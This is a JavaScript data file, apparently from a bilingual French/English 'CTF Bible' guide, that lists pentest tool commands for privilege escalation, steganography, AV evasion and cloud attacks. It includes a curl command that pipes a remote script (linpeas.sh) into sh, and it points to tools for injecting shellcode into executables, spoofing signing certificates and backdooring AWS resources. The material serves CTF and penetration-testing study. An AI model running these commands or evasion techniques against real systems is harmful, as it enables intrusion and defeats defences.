      { label: "Privilege Escalation et Post-Exploitation", label_en: "Privilege Escalation and Post-Exploitation", cmd: "# LinPEAS / WinPEAS (PEASS-ng) :\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n# LinEnum :\nbash linenum.sh -t\n# GTFOBins — binaires Unix pour bypass :\n# gtfobins.github.io\n# LOLBAS — Living Off The Land (Windows) :\n# lolbas-project.github.io\n# Linux Exploit Suggester :\npython linux-exploit-suggester.py\n# unix-privesc-check :\nsh unix-privesc-check standard\n# ADAPE — Active Directory privilege escalation :\n# github.com/hausec/ADAPE-Script\n# Hwacha — exécuter payloads via SSH sur plusieurs Linux :\n# github.com/n00py/Hwacha\n# Lynis — audit UNIX :\nlynis audit system" },
      { label: "Stéganographie et analyse de fichiers", label_en: "Steganography and file analysis", cmd: "# Analyse initiale :\nfile suspicious.*; exiftool suspicious.*; binwalk suspicious.*\nstrings suspicious.* | grep -i 'flag\\|password\\|secret'\n# ExifTool — métadonnées :\nexiftool -all image.jpg\n# Steganographie :\nsteghide extract -sf image.jpg\nzsteg image.png  # PNG/BMP\nstegcracker image.jpg /usr/share/wordlists/rockyou.txt\n# StegOnline (web) : stegonline.georgeom.net\n# Cloakify — stéganographie textuelle :\n# Aperisolve.com — analyse tout en ligne\n# Analyse PDF :\npeepdf suspicious.pdf\n# Kaitai Struct — formats binaires :\nksc format.ksy -t python\n# Veles — visualisation données binaires" },
      { label: "AV Evasion et Cloud Attacks", label_en: "AV Evasion and Cloud Attacks", cmd: "# AV Evasion :\n# Veil — payloads Metasploit qui bypass AV :\nveil\n# Shellter — injection shellcode dans PE :\nshellter -a -f /path/to/legit.exe\n# Amber — PE → shellcode position-independent :\n# github.com/EgeBalci/amber\n# CarbonCopy — spoof certificat + signer exe :\n# UniByAv — obfuscateur XOR simple\n# AVET — post-process exploits pour Windows\n\n# Cloud Platform Attacks :\n# CloudHunter — buckets AWS/Azure/GCP vulnérables :\n# github.com/belane/CloudHunter\n# Cloudsplaining — violations least privilege IAM AWS :\ncloudsplaining scan --input-file iam-policy.json\n# GCPBucketBrute — brute force Google Storage\n# Endgame — backdoor AWS resources\n# CCAT — Cloud Container Attack Tool (Rhino Security)" }
    ],
    lookfor: [
      "Phase Discovery : BBOT, httpx, naabu, nuclei — toujours valider les assets avant de scanner",
      "Phase Web : Burp Suite + nuclei + gobuster — les trois ensemble couvrent l'essentiel",
      "Phase Post-Exploitation : LinPEAS/WinPEAS → GTFOBins/LOLBAS → impacket-secretsdump",
      "Binaires suspects : Ghidra ou Radare2 pour décompiler, pwntools + pwndbg pour exploiter",
      "Cloud : vérifier les buckets S3/GCS publics avec CloudHunter, IAM avec Cloudsplaining"
    ],
    lookfor_en: [
      "Discovery phase: BBOT, httpx, naabu, nuclei — always validate assets before scanning",
      "Web phase: Burp Suite + nuclei + gobuster — all three together cover the essentials",
      "Post-Exploitation phase: LinPEAS/WinPEAS → GTFOBins/LOLBAS → impacket-secretsdump",
      "Suspicious binaries: Ghidra or Radare2 to decompile, pwntools + pwndbg to exploit",
      "Cloud: check public S3/GCS buckets with CloudHunter, IAM with Cloudsplaining"
    ],
    tips: [
      "Kali Linux regroupe la plupart de ces outils : apt install kali-linux-everything",
      "ctf-tools (github.com/zardus/ctf-tools) centralise l'installation des outils CTF",
      "The Pentesters Framework (PTF) organise les outils autour du PTES",
      "SecLists (danielmiessler/SecLists) : la collection de wordlists/payloads indispensable",
      "GTFOBins et LOLBAS à consulter systématiquement après avoir un shell limité"
    ],
    tips_en: [
      "Kali Linux includes most of these tools: apt install kali-linux-everything",
      "ctf-tools (github.com/zardus/ctf-tools) centralizes CTF tool installation",
      "The Pentesters Framework (PTF) organizes tools around the PTES",
      "SecLists (danielmiessler/SecLists): the essential wordlists/payloads collection",
      "GTFOBins and LOLBAS to check systematically after getting a limited shell"
    ],
    choices: [
      { label: "Retour à la méthodologie pentest", label_en: "Back to pentest methodology", next: "pentest_methodology", icon: "📋" },
      { label: "Retour au menu principal", label_en: "Back to main menu", next: "start", icon: "🏠" },
      { label: "OSINT — trouver des assets", label_en: "OSINT — find assets", next: "osint", icon: "🔭" }
    ]
  }

}); // fin Object.assign

// ─── Patch des nœuds existants ────────────────────────────────────────────────

// start → ajouter l'approche CTF et la méthodologie pentest
NODES["start"].choices.push(
  { label: "Approche méthodique pentest / CTF Boot2Root", label_en: "Methodical pentest / CTF Boot2Root approach", next: "pentest_methodology", icon: "📋" },
  { label: "OSINT — recherche sur domaine ou personne", label_en: "OSINT — research on domain or person", next: "osint", icon: "🔭" },
  { label: "Arsenal d'outils awesome-pentest", label_en: "awesome-pentest tool arsenal", next: "awesome_tools", icon: "🛠️" }
);

// forensics → ajouter les spécialisations
NODES["forensics"].choices.push(
  { label: "Dump mémoire RAM → Volatility 2/3", label_en: "RAM memory dump → Volatility 2/3", next: "forensics_memory", icon: "🧠" },
  { label: "Image disque → Autopsy / Sleuthkit", label_en: "Disk image → Autopsy / Sleuthkit", next: "forensics_disk", icon: "💾" },
  { label: "Capture réseau PCAP → Wireshark / Zeek", label_en: "PCAP network capture → Wireshark / Zeek", next: "forensics_network", icon: "🌐" }
);

// password_crack → ajouter techniques avancées
NODES["password_crack"].choices.push(
  { label: "Techniques avancées (règles, masques, spray, CeWL)", label_en: "Advanced techniques (rules, masks, spray, CeWL)", next: "password_attacks_advanced", icon: "🔓" }
);

// flag_found → ajouter lien vers l'approche CTF (pour continuer)
NODES["flag_found"].choices.push(
  { label: "Aborder un nouveau challenge CTF", label_en: "Tackle a new CTF challenge", next: "ctf_approach", icon: "🎯" }
);

console.log("[CTF Bible] Méthodologie & Forensics chargés :", Object.keys(NODES).length, "nœuds au total");
